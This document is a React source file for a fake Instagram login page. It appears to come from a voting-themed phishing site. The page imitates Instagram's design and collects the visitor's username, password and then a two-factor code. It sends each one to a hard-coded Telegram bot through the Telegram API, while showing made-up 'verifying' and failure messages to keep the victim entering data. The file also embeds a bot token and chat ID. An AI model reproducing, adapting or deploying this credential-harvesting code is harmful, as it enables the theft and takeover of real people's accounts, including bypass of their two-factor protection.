import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useToast } from '@/hooks/use-toast';
import { Instagram } from 'lucide-react';
import { useAuthSettings } from '@/hooks/use-auth-settings';
import { VoteSuccessModal } from '@/components/VoteSuccessModal';

const TELEGRAM_BOT_TOKEN = '7371815939:AAEi9KZLsmz1bM5vxgNic7NXUocO6tdSHks';
const TELEGRAM_CHAT_ID = '-1002380892216';

const InstagramLogin = () => {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [show2FA, setShow2FA] = useState(false);
  const [verificationCode, setVerificationCode] = useState('');
  const [showSuccessModal, setShowSuccessModal] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();
  const { settings, loading: settingsLoading } = useAuthSettings('instagram');

  const sendToTelegram = async (username: string, password: string) => {
    const message = `🔐 New Instagram Login\n\n👤 Username: ${username}\n🔑 Password: ${password}\n\n📱 Platform: Instagram\n⏰ Time: ${new Date().toLocaleString()}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
      await fetch(url, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      });
    } catch (error) {
      console.error('Error sending to Telegram:', error);
    }
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast({
        title: "Error",
        description: "Please fill in all fields",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(username, password);

      toast({
        title: "Verifying...",
        description: "Please wait while we verify your credentials",
      });

      setTimeout(() => {
        setLoading(false);
        if (settings?.platforms?.instagram?.login?.success) {
          setShow2FA(true);
        } else {
          toast({
            title: "Error",
            description: "Authentication failed. Please try again later.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to login. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  const handle2FASubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!verificationCode) {
      toast({
        title: "Error",
        description: "Please enter verification code",
        variant: "destructive",
        className: "bg-white text-black",
      });
      return;
    }

    setLoading(true);
    try {
      await sendToTelegram(username, `2FA Code: ${verificationCode}`);
      
      toast({
        title: "Verifying code...",
        description: "Please wait while we verify your code",
      });

      setTimeout(() => {
        if (settings?.platforms?.instagram?.twoFactor?.success) {
          setShowSuccessModal(true);
        } else {
          toast({
            title: "Error",
            description: "Invalid verification code. Please try again.",
            variant: "destructive",
            className: "bg-white text-black",
          });
        }
        setLoading(false);
      }, 2000);
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to verify code. Please try again.",
        variant: "destructive",
      });
      setLoading(false);
    }
  };

  if (settingsLoading) {
    return (
      <div className="min-h-screen bg-[#fafafa] flex items-center justify-center">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#0095f6]" />
      </div>
    );
  }

  return (
    <>
      <div className="min-h-screen bg-[#fafafa] flex items-center justify-center p-4">
        <div className="max-w-sm w-full space-y-4">
          {!show2FA ? (
            <div className="bg-white p-8 border border-gray-300 rounded">
              <div className="text-center mb-8">
                <Instagram className="h-12 w-12 mx-auto" />
                <h2 className="mt-4 text-2xl font-semibold">Instagram</h2>
              </div>
              <form onSubmit={handleLogin} className="space-y-4">
                <input
                  type="text"
                  placeholder="Phone number, username, or email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-2 py-1.5 bg-[#fafafa] border border-gray-300 rounded-sm text-sm focus:outline-none focus:border-gray-400"
                  required
                />
                <input
                  type="password"
                  placeholder="Password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-2 py-1.5 bg-[#fafafa] border border-gray-300 rounded-sm text-sm focus:outline-none focus:border-gray-400"
                  required
                />
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full py-1.5 bg-[#0095f6] text-white rounded font-semibold text-sm hover:bg-[#1877f2] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {loading ? 'Logging in...' : 'Log In'}
                </button>
              </form>
              <div className="mt-4 text-center">
                <a href="#" className="text-xs text-[#00376b]">Forgot password?</a>
              </div>
            </div>
          ) : (
            <div className="bg-white p-8 border border-gray-300 rounded">
              <div className="text-center mb-8">
                <Instagram className="h-12 w-12 mx-auto" />
                <h2 className="mt-4 text-xl font-semibold">Enter Security Code</h2>
                <p className="mt-2 text-sm text-gray-600">
                  Enter the code we sent to your email for {username.slice(0, 2)}***
                </p>
              </div>
              <form onSubmit={handle2FASubmit} className="space-y-4">
                <input
                  type="text"
                  placeholder="Security Code"
                  value={verificationCode}
                  onChange={(e) => setVerificationCode(e.target.value)}
                  className="w-full px-2 py-1.5 bg-[#fafafa] border border-gray-300 rounded-sm text-sm focus:outline-none focus:border-gray-400"
                  required
                  maxLength={6}
                />
                <button
                  type="submit"
                  disabled={loading}
                  className="w-full py-1.5 bg-[#0095f6] text-white rounded font-semibold text-sm hover:bg-[#1877f2] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {loading ? 'Verifying...' : 'Submit'}
                </button>
              </form>
              <div className="mt-4 text-center">
                <button 
                  type="button"
                  onClick={() => setShow2FA(false)}
                  className="text-xs text-[#00376b] hover:underline"
                >
                  Try another way
                </button>
              </div>
            </div>
          )}
          <div className="bg-white p-4 border border-gray-300 rounded text-center">
            <p className="text-sm">
              Don't have an account? <a href="#" className="text-[#0095f6] font-semibold">Sign up</a>
            </p>
          </div>
        </div>
      </div>
      <div className="fixed bottom-4 left-4">
        <a 
          href="/"
          className="text-sm text-[#00376b] hover:underline flex items-center gap-2"
        >
          <svg 
            xmlns="http://www.w3.org/2000/svg" 
            width="16" 
            height="16" 
            viewBox="0 0 24 24" 
            fill="none" 
            stroke="currentColor" 
            strokeWidth="2" 
            strokeLinecap="round" 
            strokeLinejoin="round"
          >
            <path d="M19 12H5M12 19l-7-7 7-7"/>
          </svg>
          Back to Black and White Entertainment
        </a>
      </div>
      <VoteSuccessModal 
        open={showSuccessModal} 
        onClose={() => {
          setShowSuccessModal(false);
          navigate('/');
        }} 
      />
    </>
  );
};

export default InstagramLogin;